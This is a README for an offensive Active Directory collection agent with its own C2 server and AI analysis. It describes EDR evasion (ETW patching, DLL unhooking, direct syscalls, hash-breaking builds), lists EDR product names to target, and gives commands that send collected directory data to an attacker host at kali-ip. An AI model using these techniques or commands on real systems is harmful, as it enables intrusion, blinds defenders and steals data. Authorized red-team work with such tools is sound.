# AD-Necromancer V2

> **"Humans forget. Directories do not."**

A self-contained, EDR-evasive Active Directory privilege archaeology engine.  
V2 **no longer requires SharpHound** — it collects directly from AD via **real ADWS (MC-NMF/NTLM) or LDAP**, encrypts the output with AES-256-GCM, and feeds it into the AI analysis engine.  
One binary. Zero dependencies. Now ships with **The Grimoire** — a full C2 receiver + interactive gothic UI.

---

## ⚡ What's New in V2

| Feature | V1 | V2 |
|---|---|---|
| Data collection | Requires pre-run SharpHound | **Live ADWS (MC-NMF/NTLM) → LDAP fallback** |
| ADWS protocol | ❌ Broken HTTP stub | **✅ Real MC-NMF TCP framing on port 9389** |
| Authentication | Basic Auth (rejected by Windows) | **NTLM Negotiate/Challenge/Authenticate** |
| EDR evasion | None | **ETW patch, DLL unhooking, Halos Gate syscalls, XOR obfuscation** |
| Output | Console only | **AES-256-GCM encrypted zip — key NEVER printed** |
| Key handling | Printed in plaintext to console | **Saved to `adn_key_YYYYMMDD_HHMMSS.key` (0400 perms)** |
| C2 receiver | ❌ None | **✅ The Grimoire — gothic HTTPS C2 UI** |
| BH format | Import JSONs manually | **Auto-generates BloodHound CE v6 JSON** |
| Binary hash | Static | **Polymorphic: different SHA256 on every build** |
| Privacy Cloak | ✅ | ✅ (preserved + used in Grimoire AI chat) |
| AI Analysis | ✅ | ✅ (`--analyze` + interactive What-If chatbox in Grimoire) |

---

## 🔥 V2 Architecture

```
┌───────────────────────────────────────────────────────────────────┐
│                        AD-Necromancer V2                          │
│                                                                   │
│  ┌─────────────────┐    ┌──────────────────────────────────────┐  │
│  │  EDR Evasion    │    │         Collection Engine            │  │
│  │   Bootstrap     │    │  ADWS-First (MC-NMF/NTLM, port 9389)│  │
│  │                 │    │       ↓ fallback on failure          │  │
│  │ • ETW patch     │    │  LDAP Ghosting (port 389/636)        │  │
│  │ • DLL unhook    │    │  Stealth jitter · 3-retry logic      │  │
│  │ • Halos Gate    │    └────────────────┬─────────────────────┘  │
│  │ • XOR strings   │                     │                        │
│  └─────────────────┘    ┌────────────────▼─────────────────────┐  │
│                         │          Output Pipeline             │  │
│                         │  BH CE v6 JSON → AES-256-GCM Zip    │  │
│                         │  Key → adn_key_YYYYMMDD_HHMMSS.key  │  │
│                         │  Payload → Local / HTTPS C2          │  │
│                         └────────────────┬─────────────────────┘  │
│                                          │                        │
│                         ┌────────────────▼─────────────────────┐  │
│                         │       AI Necromancy Engine           │  │
│                         │  --analyze · Privacy Cloak           │  │
│                         │  DeepSeek · Claude · Gemini · OpenAI│  │
│                         └──────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────┐
│                     The Grimoire (C2 Server)                      │
│                                                                   │
│  POST /upload ←── Agent --exfil ──────────────────────────────►  │
│  POST /api/offline-load ←── Manual zip+key upload                │
│  GET  /api/events ──► SSE push to all browsers                   │
│                                                                   │
│  ┌─────────────────────────┐  ┌──────────────────────────────┐   │
│  │  Cytoscape.js Graph     │  │   ☠ THE GRIMOIRE ☠           │   │
│  │  (BloodHound-compatible)│  │                              │   │
│  │  • Node types + colors  │  │  Privilege Archaeology       │   │
│  │  • ACE edge highlighting│  │  Findings (Claude AI)        │   │
│  │  • Neighborhood search  │  │                              │   │
│  │  • Click → What-If      │  │  Ask the Dead — What-If      │   │
│  │                    70%  │  │  Simulator chatbox     30%   │   │
│  └─────────────────────────┘  └──────────────────────────────┘   │
└───────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### Agent — Live Collection

```powershell
# Auto mode: tries ADWS first, falls back to LDAP
.\ad-necromancer.exe -u jdoe -d corp.local -p P@ssw0rd

# Stealth mode (minimal output, jitter, EDR evasion max)
.\ad-necromancer.exe -u jdoe -d corp.local -p P@ssw0rd --stealth

# Exfil to The Grimoire C2
.\ad-necromancer.exe -u jdoe -d corp.local -p P@ssw0rd --exfil https://kali-ip:8443/upload

# Full stealth + AI analysis + exfil
.\ad-necromancer.exe -u jdoe -d corp.local -p P@ssw0rd --stealth --exfil https://kali-ip:8443/upload --analyze --claude

# Offline mode — analyze existing BloodHound JSON directory
.\ad-necromancer.exe --data C:\path\to\jsons --analyze
```

### The Grimoire — C2 Server (run on Kali / Linux)

```bash
# Set your Anthropic key (Claude is the default AI backend for the Grimoire)
export ANTHROPIC_API_KEY="sk-ant-..."

# Start the C2 server (self-signed cert generated automatically)
go run ./cmd/grimoire/

# Or with explicit key and custom port
go run ./cmd/grimoire/ --api-key sk-ant-... --port 8443
```

Then open **`https://kali-ip:8443`** in a browser (accept the self-signed cert warning).

The Grimoire will:
1. Auto-load data the moment an agent POSTs to `/upload`
2. Build a Cytoscape.js graph of the AD environment
3. Tokenize all entity names in memory (Privacy Cloak)
4. Trigger an initial Claude AI privilege archaeology analysis
5. Enable the interactive What-If chatbox

### Polymorphic Build from Source

```powershell
# Requires Go 1.21+ and garble
git clone https://github.com/0xSense1/AD-Necromancer.git
cd AD-Necromancer

# Different SHA256 on every build
.\build.ps1
```

---

## 📋 Agent Flags

### Collection (Live Mode)

| Flag | Default | Description |
|---|---|---|
| `-u, --username` | — | AD username |
| `-d, --domain` | — | Domain FQDN (e.g. `corp.local`) |
| `-p, --password` | — | Password |
| `--dc` | auto | DC hostname/IP |
| `--method` | `auto` | `adws` \| `ldap` \| `auto` |

### Output

| Flag | Default | Description |
|---|---|---|
| `--local` | `true` | Save `adn_data.zip` locally |
| `--exfil` | — | HTTPS C2 URL for encrypted zip upload |

### Analysis (AI Engine)

| Flag | Default | Description |
|---|---|---|
| `--analyze` | `false` | Run AI privilege archaeology |
| `--data` | — | Offline: path to BloodHound JSON directory |
| `--claude` | — | Use Anthropic Claude |
| `--gemini` | — | Use Google Gemini |
| `--openai` | — | Use OpenAI |
| `--on-premise` | — | Use local Ollama |
| `--sample-size` | `20` | Max entities per type sent to AI |

### Evasion

| Flag | Default | Description |
|---|---|---|
| `--stealth` | `false` | Max evasion: jitter, minimal output, all ops silent |
| `--no-unhook` | `false` | Disable DLL unhooking (debug) |
| `--no-etw-patch` | `false` | Disable ETW patching (debug) |

### Privacy

| Flag | Default | Description |
|---|---|---|
| `--no-privacy-cloak` | `false` | Send real names to remote AI (not recommended) |
| `--save-mapping` | `false` | Save tokenization mapping to disk |
| `--debug` | `false` | Show AI payload to verify Privacy Cloak |

### Grimoire Server Flags

| Flag | Default | Description |
|---|---|---|
| `--port` | `8443` | HTTPS listen port |
| `--api-key` | env | Anthropic API key (or `ANTHROPIC_API_KEY` env var) |

---

## 🌐 ADWS Implementation — MC-NMF / NTLM

The old ADWS client used plain HTTP with Basic Auth — which Windows ADWS flatly rejects. V2 implements the full protocol stack:

```
TCP:9389
  └─► MC-NMF Preamble (VersionRequest → ModeRequest → ViaRequest → KnownEncoding → PreambleEnd)
        └─► NTLM Negotiate (Type1 → Type2 Challenge → Type3 Authenticate)
              └─► WS-Enumeration SOAP (Enumerate → paginated Pull until EndOfSequence)
                    └─► XML parse → bh.Node graph
```

**Status messages during collection:**
```
[*] ADWS-First: Connecting to port 9389...
[+] ADWS-First: Connected successfully
 — or —
[!] ADWS-First: Failed - falling back to LDAP Ghosting
```

**Collects:** Users, Groups, Computers, Domains, GPOs, OUs, Certificate Templates, Enterprise CAs, `nTSecurityDescriptor` ACLs, delegation attributes, `msDS-KeyCredentialLink`.

---

## 🛡️ EDR Evasion — How It Works

### 1. XOR String Obfuscation (`internal/evasion/strings.go`)
Every sensitive string — DLL names, `LDAP`, `ADWS`, `9389`, `EtwEventWrite`, API function names — is stored as pre-XOR'd byte literals in source. The plaintext never appears in the binary's string table.

### 2. PEB Walker (`internal/evasion/peb.go` + `peb_amd64.s`)
Module enumeration via `GS:[0x60]` (PEB pointer, Plan 9 assembly) → `PEB_LDR_DATA` → `InLoadOrderModuleList`. Finds loaded DLLs without ever calling `GetModuleHandle` or `LoadLibrary`.

### 3. EDR DLL Unhooking (`internal/evasion/unhook.go`)
1. Locate hooked DLL in memory via PEB walk
2. Read clean `.text` section from `C:\Windows\System32\<dll>.dll`
3. Make `.text` writable via `NtProtectVirtualMemory` direct syscall
4. `copy()` clean bytes over hooked bytes → hooks removed
5. Restore original page protection

Targets: `ntdll.dll`, `kernelbase.dll`, and any DLL matching EDR name patterns (`csfalcon`, `sentinel`, `edr`, `mde`, `elastic`, `cylance`, `cbdll`).

### 4. ETW Patching (`internal/evasion/etw.go`)
Writes `0xC3` (RET) to the first byte of `EtwEventWrite`, `EtwEventWriteFull`, and `NtTraceEvent` via direct syscall. Kills most user-mode telemetry before any collection begins.

### 5. Halos Gate (`internal/evasion/syscall.go` + `peb_amd64.s`)
- Walks the ntdll export table at runtime to extract syscall service numbers (SSNs)
- If a stub is hooked (`JMP` at offset 0), scans neighbouring stubs ±N to recover the correct SSN
- Invokes `SYSCALL` directly via Plan 9 assembly — no call through ntdll

---

## 🔑 Encrypted Output & Key Handling

Every run produces `adn_data.zip` + `adn_key_YYYYMMDD_HHMMSS.key`:

```
  ╔══════════════════════════════════════════════════════════╗
  ║  🔐 ENCRYPTED DATA SAVED                                 ║
  ║                                                          ║
  ║  Payload  : adn_data.zip (AES-256-GCM)                  ║
  ║  Key file : adn_key_20260409_191822.key                  ║
  ║                                                          ║
  ║  ⚠  Keep this key safe.                                  ║
  ║     It will NOT be saved automatically anywhere else.    ║
  ╚══════════════════════════════════════════════════════════╝
```

- Key is written with **`0400` permissions** (owner read-only)
- Key hex is **never printed to the terminal**
- In `--stealth` mode: single silent line `[key]→adn_key_YYYYMMDD_HHMMSS.key`
- If `--exfil` is set: key is sent as `X-Session-Key` HTTP header to the C2, which decrypts and loads the data automatically

Import `adn_data.zip` directly into BloodHound CE — it accepts the zipped JSON format natively. Or load it into **The Grimoire** with the `.key` file for the interactive AI analysis experience.

---

## ☠ The Grimoire — C2 UI

The Grimoire is a standalone Go HTTPS server that serves an embedded gothic web UI.

### Ingestion modes

**Online (agent exfil):**
```bash
# Agent uploads automatically
.\ad-necromancer.exe ... --exfil https://kali-ip:8443/upload
# → Grimoire decrypts, parses, pushes graph to all connected browsers via SSE
```

**Offline (manual upload):**
- Click **⚡ OFFLINE UPLOAD** in the UI
- Select `adn_data.zip` and the `adn_key_*.key` file
- Grimoire decrypts server-side and loads the graph

### Graph features
- Node type colours: User (purple), Group (red), Computer (blue), Domain (gold), GPO (green), CertTemplate (crimson), EnterpriseCA (dark red)
- High-value/admincount nodes enlarged with bright border
- Disabled/stale nodes rendered as ghosts (dashed border, dimmed)
- Click a node → neighbourhood highlight + info card
- **"☠ What if I compromise this?"** button auto-fills chat with a kill chain question
- Edge labels for critical ACEs (`GenericAll`, `DCSync`, `WriteDACL`, etc.) in bright red
- Search box: type any name, token, or SAM — matching nodes highlighted + viewport fit

### AI Privacy Cloak (in-browser)
All real entity names are replaced with `ENTITY_NNN` tokens **before** any data leaves the browser for Claude:
- User types: `"What if I compromise DC1?"` → sent as `"What if I compromise ENTITY_042?"`
- Claude responds with tokens → browser detokenizes to real names before display
- Token mapping persists for the entire browser session
- Chat history keeps tokenized form (persistent context across turns)

### Automatic analysis
On data load, the Grimoire auto-sends a tokenized environment summary to Claude for initial privilege archaeology. Results appear in the **⚰ PRIVILEGE ARCHAEOLOGY FINDINGS** panel with `CRITICAL` / `HIGH` / `MEDIUM` severity markers.

---

## 🔒 Privacy Cloak

When using remote AI backends, Privacy Cloak tokenizes all sensitive AD identifiers before they leave your machine. The AI never sees real names.

```
"svc_backup_legacy@CORP.LOCAL"  →  "ENTITY_007"
"DOMAIN ADMINS@CORP.LOCAL"      →  "ENTITY_012"
"DC01.CORP.LOCAL"               →  "ENTITY_003"
```

| Scenario | Privacy Cloak |
|---|---|
| Remote AI (default) | ✅ ON |
| On-premise Ollama | ⚪ OFF |
| `--no-privacy-cloak` | ❌ Disabled |
| Grimoire chatbox | ✅ Always ON (JS in-browser) |

---

## ♻️ Polymorphic Build System

Every invocation of `build.ps1` produces a **different binary hash**:

```powershell
.\build.ps1
# SHA-256: F5BBA9CBB718604CFA427A1C6991478197600FB31F2B4F5238A5B5E518F059BA

.\build.ps1
# SHA-256: D3E7693F8BA0AA929F2E101A03F33E09C389A32474D183318DD36AA4B35B7DD4
```

| Layer | Technique | Effect |
|---|---|---|
| 1 | `garble -seed=random -literals -tiny` | Randomizes function names, symbol table, string encoding |
| 2 | `-ldflags -X phantom.BuildID=<UUID v4>` | Unique 36-char string embedded in binary per compile |
| 3 | `gen_phantom.go` regenerates `phantom.go` with 256 new random bytes | Mutates `.data` section |

Breaks hash-based EDR/AV blocklists that trigger before behavioral analysis.

---

## 🔧 AI Backend Setup

Set the appropriate environment variable before running:

```powershell
# DeepSeek (agent default)
$env:DEEPSEEK_API_KEY="your-key"

# Anthropic Claude (Grimoire default + agent --claude)
$env:ANTHROPIC_API_KEY="your-key"
# Optional: set model
$env:CLAUDE_MODEL="claude-opus-4-5"

# OpenAI
$env:OPENAI_API_KEY="your-key"

# Google Gemini
$env:GEMINI_API_KEY="your-key"

# Ollama (local — no key needed)
$env:OLLAMA_ENDPOINT="http://localhost:11434"
$env:OLLAMA_MODEL="llama3"
```

**Agent priority:** Ollama → Claude → Gemini → OpenAI → DeepSeek

---

## 📊 Sample AI Analysis Output

```
╔══════════════════════════════════════════════════════════════════════════════╗
║ ☠  CRITICAL — RBCD Residue on Decommissioned Test System                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

[ENTITY] ENTITY_042 (Computer)

[SECURITY INTERPRETATION]
  ▸ ENTITY_007 has AddAllowedToAct on ENTITY_042
  ▸ Enables RBCD — attacker can impersonate any user to any service on this host
  ▸ Forgotten config from decommissioned test project, last touched 892 days ago

[UNDEAD CONTROL PATH]
         🟣 ENTITY_007 (User)
                │ AddAllowedToAct
                ▼
         🔴 ENTITY_042 (Computer, RBCD)
                ▼
         🔴 Domain Compromise

[EXECUTION VECTORS]
  • Set SPN on controlled account → rbcd.py → impersonate DA
  • getST.py -spn cifs/ENTITY_042 → pass-the-ticket

[MITIGATION]
  Remove AddAllowedToAct from ENTITY_042.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## 🗂️ Project Structure

```
ad-necromancer/
├── cmd/
│   ├── ad-necromancer/
│   │   └── main.go             ← Agent entry point
│   └── grimoire/
│       ├── main.go             ← The Grimoire C2 server
│       └── web/
│           └── index.html      ← Embedded gothic UI (Cytoscape.js)
├── build.ps1                   ← Polymorphic build script
├── internal/
│   ├── evasion/                ← EDR evasion layer
│   │   ├── strings.go          ← XOR obfuscated sensitive strings
│   │   ├── peb.go              ← PEB walker (no GetModuleHandle)
│   │   ├── peb_amd64.s         ← gs:[0x60] + direct SYSCALL stubs (Plan 9 asm)
│   │   ├── syscall.go          ← Halos Gate SSN extraction + NtProtectVirtualMemory
│   │   ├── unhook.go           ← EDR DLL unhooker
│   │   └── etw.go              ← ETW patcher + evasion Bootstrap()
│   ├── adws/
│   │   ├── client.go           ← MC-NMF TCP framing + NTLM + WS-Enumeration
│   │   └── base64.go           ← Base64 helpers for NTLM token encoding
│   ├── ldap/                   ← LDAP client + collector (LDAP Ghosting fallback)
│   ├── collector/collector.go  ← ADWS-First auto-select with LDAP fallback
│   ├── bh/                     ← BloodHound CE v6 formatter + types
│   ├── crypto/aes.go           ← AES-256-GCM zip encrypt/decrypt
│   ├── exfil/exfil.go          ← Local save + key file + HTTPS C2 upload
│   ├── phantom/                ← Polymorphic padding + BuildID injection
│   ├── necromancy/engine.go    ← AI analysis engine + ZombiePath output
│   ├── privacy/                ← Privacy Cloak tokenizer
│   └── prompts/prompts.go      ← Necromancer system prompt
```

---

## ⚠️ Legal Disclaimer

AD-Necromancer is an **offensive security research tool** intended exclusively for:
- Authorized penetration testing engagements
- Red team operations with written permission
- Security research in controlled lab environments
- Academic and conference demonstrations (e.g. DEFCON)

**Unauthorized use against systems you do not own or have explicit permission to test is illegal.** The authors assume no liability for misuse.

---

## 📝 License

MIT